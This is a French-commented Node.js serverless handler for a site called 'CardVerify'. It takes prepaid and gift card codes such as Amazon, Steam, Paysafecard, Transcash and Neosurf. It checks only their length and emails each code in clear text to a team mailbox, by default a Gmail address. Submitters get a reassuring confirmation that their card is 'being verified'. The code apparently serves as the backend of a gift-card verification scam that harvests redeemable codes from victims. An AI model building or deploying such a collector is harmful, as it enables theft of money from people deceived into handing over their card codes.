// ================================================================
//  CardVerify — api/send.js
//  Endpoint : POST /api/send
//  - Valide le payload
//  - Email 1 → équipe  (code EN CLAIR dans un tableau HTML)
//  - Email 2 → utilisateur (confirmation de réception)
// ================================================================

const { Resend } = require('resend');

// ── Config des 8 types de cartes ─────────────────────────────────
const CARD_CONFIGS = {
  amazon:      { label: 'Amazon',      emoji: '📦', minLen: 14, maxLen: 16 },
  itunes:      { label: 'iTunes',      emoji: '🎵', minLen: 16, maxLen: 16 },
  neosurf:     { label: 'Neosurf',     emoji: '💳', minLen: 10, maxLen: 10 },
  pcs:         { label: 'PCS',         emoji: '🏪', minLen: 16, maxLen: 16 },
  paysafecard: { label: 'Paysafecard', emoji: '🔐', minLen: 16, maxLen: 16 },
  steam:       { label: 'Steam',       emoji: '🎮', minLen: 15, maxLen: 15 },
  transcash:   { label: 'Transcash',   emoji: '💸', minLen: 14, maxLen: 14 },
  vanilla:     { label: 'Vanilla',     emoji: '🍦', minLen: 16, maxLen: 16 },
};

// ── Sanitisation HTML ─────────────────────────────────────────────
function esc(str) {
  if (typeof str !== 'string') return '';
  return str.trim()
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// ── Email 1 : Équipe — tableau complet avec code EN CLAIR ─────────
function buildTeamEmail(d) {
  const now = new Date().toLocaleString('fr-FR', {
    timeZone: 'Europe/Paris', dateStyle: 'full', timeStyle: 'medium',
  });

  const rows = [
    ['Type de carte',   `${esc(d.cardEmoji)} ${esc(d.cardLabel)}`],
    ['Code (en clair)', `<span style="font-family:Courier New,monospace;font-size:20px;font-weight:800;color:#8b78ff;letter-spacing:0.2em;background:#09090f;padding:4px 12px;border-radius:6px;display:inline-block">${esc(d.cardCode)}</span>`],
    ['Montant',         esc(d.amount)       || '<em style="color:#6b6585">Non renseigné</em>'],
    ['Date d\'achat',   esc(d.purchaseDate) || '<em style="color:#6b6585">Non renseignée</em>'],
    ['Canal d\'achat',  esc(d.channel)      || '<em style="color:#6b6585">Non renseigné</em>'],
    ['Nom',             esc(d.userName)     || '<em style="color:#6b6585">Non renseigné</em>'],
    ['Email',           `<a href="mailto:${esc(d.userEmail)}" style="color:#8b78ff">${esc(d.userEmail)}</a>`],
    ['Message',         esc(d.message)      || '<em style="color:#6b6585">Aucun message</em>'],
    ['Soumis le',       now],
  ];

  const tableRows = rows.map(([label, val]) => `
    <tr>
      <td style="padding:12px 18px;border-bottom:1px solid rgba(255,255,255,0.06);color:#6b6585;font-size:13px;white-space:nowrap;font-family:DM Mono,Courier New,monospace;width:160px">${label}</td>
      <td style="padding:12px 18px;border-bottom:1px solid rgba(255,255,255,0.06);color:#f0eeff;font-size:13px">${val}</td>
    </tr>`).join('');

  return `<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/></head>
<body style="margin:0;padding:0;background:#09090f;font-family:Inter,-apple-system,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">
  <tr><td align="center">
    <table width="580" cellpadding="0" cellspacing="0" style="max-width:580px;width:100%;">

      <!-- Header gradient -->
      <tr><td style="background:linear-gradient(135deg,#8b78ff 0%,#6c5ce7 100%);border-radius:16px 16px 0 0;padding:28px 36px;text-align:center;">
        <table width="100%" cellpadding="0" cellspacing="0">
          <tr>
            <td>
              <div style="font-size:28px;margin-bottom:6px">${esc(d.cardEmoji)}</div>
              <h1 style="margin:0;color:#fff;font-size:20px;font-weight:800;letter-spacing:-0.02em">
                Nouvelle soumission CardVerify
              </h1>
              <p style="margin:6px 0 0;color:rgba(255,255,255,0.72);font-size:13px">
                ${esc(d.cardLabel)} · ${now}
              </p>
            </td>
            <td align="right" style="vertical-align:top">
              <span style="background:rgba(99,230,190,0.2);border:1px solid rgba(99,230,190,0.35);color:#63e6be;font-size:11px;padding:4px 12px;border-radius:50px;font-family:Courier New,monospace;white-space:nowrap">
                ● Nouveau code
              </span>
            </td>
          </tr>
        </table>
      </td></tr>

      <!-- Tableau principal -->
      <tr><td style="background:#0e0e1a;border-left:1px solid rgba(139,120,255,0.18);border-right:1px solid rgba(139,120,255,0.18);padding:0">
        <table width="100%" cellpadding="0" cellspacing="0">
          ${tableRows}
        </table>
      </td></tr>

      <!-- Footer -->
      <tr><td style="background:#13131f;border:1px solid rgba(139,120,255,0.14);border-top:none;border-radius:0 0 16px 16px;padding:16px 36px;text-align:center;">
        <p style="margin:0;color:#6b6585;font-size:11px;font-family:Courier New,monospace">
          ✦ CardVerify — Notification interne · Ne pas transférer
        </p>
      </td></tr>

    </table>
  </td></tr>
</table>
</body>
</html>`;
}

// ── Email 2 : Utilisateur — confirmation ──────────────────────────
function buildUserEmail(d) {
  const safeName = esc(d.userName) || 'Utilisateur';
  const now = new Date().toLocaleString('fr-FR', {
    timeZone: 'Europe/Paris', dateStyle: 'long', timeStyle: 'short',
  });

  return `<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/></head>
<body style="margin:0;padding:0;background:#09090f;font-family:Inter,-apple-system,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:#09090f;padding:40px 20px;">
  <tr><td align="center">
    <table width="540" cellpadding="0" cellspacing="0" style="max-width:540px;width:100%;">

      <!-- Logo -->
      <tr><td style="text-align:center;padding-bottom:24px;">
        <div style="display:inline-block;background:linear-gradient(135deg,#8b78ff,#6c5ce7);border-radius:13px;width:48px;height:48px;line-height:48px;font-size:22px;text-align:center">✦</div>
        <div style="color:#f0eeff;font-size:18px;font-weight:800;margin-top:8px;letter-spacing:-0.02em">CardVerify</div>
      </td></tr>

      <!-- Card principale -->
      <tr><td style="background:#0e0e1a;border:1px solid rgba(139,120,255,0.2);border-radius:18px;overflow:hidden">

        <!-- Checkmark header -->
        <div style="text-align:center;padding:32px 32px 24px">
          <div style="width:64px;height:64px;border-radius:50%;background:rgba(99,230,190,0.1);border:2px solid rgba(99,230,190,0.25);margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px;line-height:64px">✅</div>
          <h1 style="margin:0;color:#f0eeff;font-size:21px;font-weight:800;letter-spacing:-0.02em">Soumission confirmée</h1>
          <p style="margin:10px 0 0;color:#a8a3c1;font-size:14px;line-height:1.6">
            Merci ${safeName}, votre code <strong style="color:#a594ff">${esc(d.cardLabel)}</strong>
            a bien été reçu et transmis à notre équipe.
          </p>
        </div>

        <!-- Séparateur -->
        <div style="height:1px;background:rgba(255,255,255,0.06);margin:0 24px"></div>

        <!-- Récapitulatif -->
        <div style="padding:20px 28px">
          <p style="margin:0 0 14px;color:#6b6585;font-size:11px;text-transform:uppercase;letter-spacing:0.1em;font-family:Courier New,monospace">Récapitulatif</p>
          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#6b6585;font-size:13px;width:45%">Type de carte</td>
              <td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#f0eeff;font-size:13px;font-weight:600;text-align:right">${esc(d.cardEmoji)} ${esc(d.cardLabel)}</td>
            </tr>
            ${d.amount ? `<tr>
              <td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#6b6585;font-size:13px">Montant</td>
              <td style="padding:9px 0;border-bottom:1px solid rgba(255,255,255,0.05);color:#63e6be;font-size:13px;font-weight:600;text-align:right">${esc(d.amount)}</td>
            </tr>` : ''}
            <tr>
              <td style="padding:9px 0;color:#6b6585;font-size:13px">Reçu le</td>
              <td style="padding:9px 0;color:#f0eeff;font-size:13px;text-align:right">${now}</td>
            </tr>
          </table>
        </div>

        <!-- Séparateur -->
        <div style="height:1px;background:rgba(255,255,255,0.06);margin:0 24px"></div>

        <!-- Prochaines étapes -->
        <div style="padding:20px 28px 28px">
          <p style="margin:0 0 16px;color:#6b6585;font-size:11px;text-transform:uppercase;letter-spacing:0.1em;font-family:Courier New,monospace">Prochaines étapes</p>

          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="width:32px;vertical-align:top;padding-top:2px">
                <div style="width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#8b78ff,#6c5ce7);text-align:center;line-height:26px;color:#fff;font-size:12px;font-weight:800">1</div>
              </td>
              <td style="padding:2px 0 16px 12px">
                <div style="color:#f0eeff;font-size:13px;font-weight:600;margin-bottom:3px">Vérification en cours</div>
                <div style="color:#a8a3c1;font-size:12px">Notre équipe examine votre soumission.</div>
              </td>
            </tr>
            <tr>
              <td style="width:32px;vertical-align:top;padding-top:2px">
                <div style="width:26px;height:26px;border-radius:50%;background:rgba(139,120,255,0.15);border:1px solid rgba(139,120,255,0.3);text-align:center;line-height:24px;color:#8b78ff;font-size:12px;font-weight:800">2</div>
              </td>
              <td style="padding:2px 0 16px 12px">
                <div style="color:#f0eeff;font-size:13px;font-weight:600;margin-bottom:3px">Traitement sous 24–48h</div>
                <div style="color:#a8a3c1;font-size:12px">Vous serez contacté si besoin.</div>
              </td>
            </tr>
            <tr>
              <td style="width:32px;vertical-align:top;padding-top:2px">
                <div style="width:26px;height:26px;border-radius:50%;background:rgba(139,120,255,0.15);border:1px solid rgba(139,120,255,0.3);text-align:center;line-height:24px;color:#8b78ff;font-size:12px;font-weight:800">3</div>
              </td>
              <td style="padding:2px 0 0 12px">
                <div style="color:#f0eeff;font-size:13px;font-weight:600;margin-bottom:3px">Confirmation finale</div>
                <div style="color:#a8a3c1;font-size:12px">Un email vous confirmera la clôture.</div>
              </td>
            </tr>
          </table>
        </div>

      </td></tr>

      <!-- Footer -->
      <tr><td style="text-align:center;padding:20px">
        <p style="margin:0;color:#6b6585;font-size:11px;font-family:Courier New,monospace">
          ✦ CardVerify · Email automatique<br/>
          Si vous n'avez pas soumis ce code, ignorez cet email.
        </p>
      </td></tr>

    </table>
  </td></tr>
</table>
</body>
</html>`;
}

// ── Handler principal ─────────────────────────────────────────────
module.exports = async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', process.env.ALLOWED_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST')
    return res.status(405).json({ success: false, error: 'Méthode non autorisée.' });

  try {
    const {
      cardType, cardCode, cardLabel, cardEmoji,
      amount, purchaseDate, channel,
      userEmail, userName, message,
    } = req.body || {};

    // ── Validation ──────────────────────────────────────────────
    if (!cardType || !cardCode || !userEmail)
      return res.status(400).json({ success: false, error: 'Champs requis : cardType, cardCode, userEmail.' });

    if (!CARD_CONFIGS[cardType])
      return res.status(400).json({ success: false, error: `Type de carte inconnu : ${cardType}` });

    if (!isValidEmail(userEmail))
      return res.status(400).json({ success: false, error: 'Adresse email invalide.' });

    const rawCode = cardCode.replace(/[\s\-]/g, '');
    const cfg = CARD_CONFIGS[cardType];
    if (rawCode.length < cfg.minLen || rawCode.length > cfg.maxLen)
      return res.status(400).json({
        success: false,
        error: `Code ${cfg.label} invalide (${rawCode.length} car., attendu ${cfg.minLen}–${cfg.maxLen}).`,
      });

    // ── Vérification variables d'environnement ──────────────────
    if (!process.env.RESEND_API_KEY)
      return res.status(500).json({ success: false, error: 'Configuration serveur manquante (RESEND_API_KEY).' });

    const teamEmail = process.env.TEAM_EMAIL || 'giftcardverifyteam@gmail.com';
    const fromEmail = process.env.FROM_EMAIL;
    if (!fromEmail)
      return res.status(500).json({ success: false, error: 'Configuration serveur manquante (FROM_EMAIL).' });

    // ── Données enrichies ───────────────────────────────────────
    const emailData = {
      cardType,
      cardCode:     cardCode.trim(),
      cardLabel:    cardLabel || cfg.label,
      cardEmoji:    cardEmoji || cfg.emoji,
      amount:       amount?.trim()       || '',
      purchaseDate: purchaseDate?.trim() || '',
      channel:      channel?.trim()      || '',
      userEmail:    userEmail.trim().toLowerCase(),
      userName:     userName?.trim()     || '',
      message:      message?.trim()      || '',
    };

    // ── Envoi des 2 emails ──────────────────────────────────────
    const resend = new Resend(process.env.RESEND_API_KEY);

    const [teamRes, userRes] = await Promise.allSettled([
      // Email 1 → Équipe
      resend.emails.send({
        from:    fromEmail,
        to:      teamEmail,
        subject: `🃏 [CardVerify] Nouveau code ${emailData.cardLabel} — ${emailData.userEmail}`,
        html:    buildTeamEmail(emailData),
      }),
      // Email 2 → Utilisateur
      resend.emails.send({
        from:    fromEmail,
        to:      emailData.userEmail,
        subject: `✅ Confirmation CardVerify — ${emailData.cardLabel}`,
        html:    buildUserEmail(emailData),
      }),
    ]);

    const teamOk = teamRes.status === 'fulfilled' && !teamRes.value?.error;
    const userOk = userRes.status === 'fulfilled' && !userRes.value?.error;

    if (!teamOk) {
      console.error('[CardVerify] Email équipe échoué:', teamRes.reason || teamRes.value?.error);
      return res.status(500).json({ success: false, error: 'Échec de l\'envoi. Réessayez.' });
    }

    if (!userOk) {
      console.warn('[CardVerify] Email utilisateur échoué:', userRes.reason || userRes.value?.error);
    }

    console.log(`[CardVerify] ✅ ${emailData.cardLabel} | ${emailData.userEmail} | teamOk=${teamOk} userOk=${userOk}`);

    return res.status(200).json({
      success: true,
      message: 'Code soumis avec succès.',
      emails: { team: teamOk, user: userOk },
    });

  } catch (err) {
    console.error('[CardVerify] Erreur inattendue:', err);
    return res.status(500).json({ success: false, error: 'Erreur interne. Réessayez.' });
  }
};
